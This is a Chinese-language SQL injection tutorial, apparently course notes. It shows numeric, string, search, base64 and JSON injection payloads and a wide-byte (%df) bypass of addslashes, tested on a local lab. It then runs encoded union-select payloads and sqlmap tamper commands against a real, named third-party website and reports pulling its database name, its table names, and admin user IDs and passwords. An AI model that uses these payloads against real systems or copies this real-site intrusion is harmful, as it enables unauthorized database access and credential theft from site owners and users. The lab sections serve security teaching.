![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220407-5b5c8ae2-8dbb-4602-8397-dc1c61c6359e.png)

```plain
#知识点：
1、数据表现格式类型注入
2、字符转义绕过-宽字节注入
3、数字&字符&搜索&编码&加密等

#参考资料：
https://www.cnblogs.com/bmjoker/p/9326258.html
扫描，利用工具等都不会自动判断数据类型，格式等，所以即使有漏洞也测不出来，具体还是需要人工的去观察，进行工具的修改或加载插件再次探针才可以。


#SQL注入课程体系：
1.数据库注入    - access mysql mssql oracle mongodb postgresql等
2.数据类型注入 - 数字型 字符型 搜索型 加密型(base64 json)等
3.提交方式注入 - get post cookie http头等 
4.查询方式注入 - 查询 增加 删除 更新 堆叠等
5.复杂注入利用 - 二次注入 dnslog注入 绕过bypass等
```

- 本地源码-数字&字符&搜索&编码&JSON

数字

```plain
数字型 0-9
SQL语句：$sql="select * from sy_guestbook where id=$i";
http://127.0.0.1:8081/web/news.php?id=1
不需要单引号，也可以正常运行。
在数据库中执行：select * from sy_guestbook where id=1;
不用加引号，能正常运行，所以有一些数字型的注入点，不用加引号，就是不用考虑符号的闭合。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135219543-d9c346c4-f9ed-425d-8115-cb1a511b9559.png)

字符

```plain
字符型    a-z 中文，标点符号
SQL语句：$sql="select * from sy_guestbook where gTpl='$g'";
http://127.0.0.1:8081/web/news.php?gtpl=simple
需要单引号或者双引号 ，如果不用的话，那就回报错。会以为当成函数或者参数去执行。所以必须要用到引号，需要考虑符号的闭合，才能正确去执行SQL才能正常执行。
如果这样执行：select * from sy_guestbook where gName=PHP开源多功能留言板-随意留言板官方站;
正确的执行方法：select * from sy_guestbook where gName='PHP开源多功能留言板-随意留言板官方站';
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135219544-24d4a234-8d04-4022-82bf-ba8fe9062d94.png)

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135219543-358856ab-d19a-499a-be03-ddd4b935e151.png)

```plain
如何构造payload的呢？
http://127.0.0.1:8081/web/news.php?gtpl=simple' order by 17--+

原始的SQL语句：
select * from sy_guestbook where gTpl='$g'
传入的值
simple' order by 17--+
代入数据SQL语句执行：
select * from sy_guestbook where gTpl='simple' order by 17--+'
这样才是正确的SQL注入payload
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135219596-8fb66d8f-900a-45c6-ab7f-efdd4080c48f.png)

```plain
执行：http://127.0.0.1:8081/web/news.php?gtpl=simple' +UNION+ALL+SELECT+1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+
就可以进行正确的注入语句。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220179-5159f96f-c93d-41d7-8f89-319c43e0ac97.png)

搜索

```plain
搜索型
SQL语句：$sql="select * from sy_guestbook where gName like '%$s%'";
http://127.0.0.1:8081/web/news.php?search=演示
有百分号%通配符和单引号，需要进行闭合
本身SQL语句：select * from sy_guestbook where gName like '%$s%'
写入语句：http://127.0.0.1:8081/web/news.php?search=演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+
代入执行：select * from sy_guestbook where gName like '%演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+%'
但是这种在后面闭合不了。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220087-47a24cf2-72ed-410f-8e36-745722fe17eb.png)

```plain
SQL语句：http://127.0.0.1:8081/web/news.php?search=演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 and '%'='
代入：select * from sy_guestbook where gName like '%演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 and '%'='%'
这样子就正确执行。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220106-5123e505-fa60-4839-b6c2-d8bab13a0a77.png)

编码

```plain
编码型&加密型
SQL语句：数据接受：$b=base64_decode($_GET['base']);     $sql="select * from sy_guestbook where id=$b";
http://127.0.0.1:8081/web/news.php?base=MQ==
数据进行编码（加密）后接收处理：
数据以编码（加密）值传递，发送编码值，对方常会进行解码后带入数据在进行SQL执行。在注入的时候，我们也要尝试对注入的payload进行编码后提交。
在注入的时候，需要进行编码后在进行注入：
正常语句：http://127.0.0.1:8081/web/news.php?base=1 UNION SELECT 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
经过编码后：
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220053-859fe576-6cf9-4fec-be3d-4ef86743fb47.png)

编码后：http://127.0.0.1:8081/web/news.php?base=MSBVTklPTiBTRUxFQ1QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTc=

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220518-b5e84dc3-c093-4b02-9077-f1203ef5efca.png)

JSON

```plain
json型  表现形式不一样，提交数据一样的
{“username”:"admin"}    键名和键值
取数据的时候，只会接收admin的值，不会接收双引号。

数据表现形式
json:
{"username":"admin","password":"xiaodi"}
常规：
username=admin&password=xiaodi

如何注入：
常规：username=admin and 1=1&password=xiaodi
json：{"username":"admin and 1=1","password":"xiaodi"}
```

json格式，参考：https://baike.baidu.com/item/JSON/2462549?fr=aladdin

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220468-2b318b4e-0018-4576-a99b-1535208db667.png)

json提交数据包格式：

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220450-9755bbbc-6872-4784-b4a1-3ef8e2d0086b.png)

```plain
json注入payload应该怎么构造呢？
这里使用到post提交json={"username":"admin' order by 3#"}
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220477-99591f98-778b-4748-a65c-09516ebb39a8.png)

```plain
查询用户和数据库名：
json={"username":"admin' and 1=2 union select 1,database(),user()#"}
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220737-0cf1b5ee-ceab-46bc-9c83-70ad49a91478.png)

------

- 本地靶场-字符转义处理防护-宽字节注入

```plain
SQL注入接收数据，但是数据会出现/ \这种符号
转义函数：addslashes
\n 换行
\n 字符串，但是电脑以为你是换行
对字符串进行转义，\\n进行转义。

%df就可以进行绕过，利用宽字节
原理：利用繁体字或者乱码，来进行占用两个字节。
\ 一个字节
� 两个字节
中文 两个字节
用到了addslashes函数后，再次进行注入的时候
注入payload：http://127.0.0.1:8081/web/news.php?gtpl=simple' order by 17--+
但是实际上的SQL语句执行时候：select * from sy_guestbook where gTpl='simple\' order by 17--+'
对'进行了转义，变成了\'
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220900-14051933-c473-44a5-9a0f-921626d0c3e2.png)

```plain
利用%df来进行绕过 
访问：http://127.0.0.1:8081/web/news.php?gtpl=simple%df' order by 17--+
执行的SQL语句：select * from sy_guestbook where gTpl='simple�\' order by 17-- '
�就会把后面的\占用了，从而绕过了转义
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220908-24189bce-1c35-486f-ae18-a2c891800c35.png)

------

- 真实WEB-数据编码接受处理-base64注入

```plain
网站：knotsolutions.com/case_study_view.php?id=NA==
NA==是Base64加密类型 4
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135221128-3dd11390-81fd-4dd1-b9ed-280068e49f6c.png)

```plain
那么我们应该如何注入呢？
注入语句：4 and 1=2 union select 1,2,3
经过base64编码后：http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLDIsMw==
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135220948-ef5c5c1b-4477-48e8-b542-226eb6f6ebea.png)

```plain
进行数据猜解：4 and 1=2 union select 1,database(),version()
进行编码：http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksdmVyc2lvbigp
记录database的值：knotwebdb
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135221177-d26c592c-f4b8-461e-8ee8-8f5003261eae.png)

```plain
判断版本高于5.0，就可以用information_schema进行查询。
查询knotwebdb下的表明信息：
4 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='knotwebdb'
编码后：
http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9J2tub3R3ZWJkYic=
记录一下查询到的表：
admin,careers,casestudy,imguploads,ipadd,loginip,page,slider,socialmedia
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135221307-7f6e4327-367c-49ac-ba81-f4f39a317285.png)

```plain
对admin下的表进行查询 
payload：4 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin' and table_schema='knotwebdb'
编码后：
http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSksMyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9J2FkbWluJyBhbmQgdGFibGVfc2NoZW1hPSdrbm90d2ViZGIn
记录列名entry_id,user_id,password,type,status
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135221517-6fd376df-4234-4bf0-a400-20ff9b879e92.png)

```plain
查询admin下的uer_id和password的值：
4 and 1=2 union select 1,user_id,password from admin
编码后：
http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLHVzZXJfaWQscGFzc3dvcmQgZnJvbSBhZG1pbg==
得到数据，完成注入。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135221371-26745ca5-fb1a-4796-a93f-9651eda65e2f.png)

------

- 真实WEB-JSON数据格式&MD5加密数据

```plain
MD5加密数据：
https://www.wanhuabao.com/goodslist/2e2d7fbdea1afc51.html
2e2d7fbdea1afc51是md5加密类型。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135221587-721df1e9-55d0-4877-a07d-0a3e221001ff.png)

```plain
json 格式类型：
https://www.aliyun.com/solution/industry/digitalfactory?spm=5176.19720258.J_8058803260.74.e9392c4aXqzSjs
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135221539-47684657-8fa0-4c6a-97b3-5d658ce08023.png)

------

- 工具脚本-SQLMAP-脚本Tamper使用指南

```plain
如果之前的SQL注入，sqlmap去跑，如果没有用到base64编码的脚本，那么他就不会判断出注入点。
执行：python310 sqlmap.py -u "http://knotsolutions.com/case_study_view.php?id="
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135221647-352735b5-6175-46d8-8288-2cf712c7501e.png)

```plain
这时候需要使用到tamper脚本（SQLmap自带）：
python310 sqlmap.py -u "http://knotsolutions.com/case_study_view.php?id=" --tamper=base64encode.py
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135221718-ec28f5ce-631f-4c81-8b8b-575f5fe63b81.png)

```plain
宽字节也可以进行绕过，在tamper脚本上，脚本名称：unmagicquoates.py

在php中，有magicquoates转义开关。
```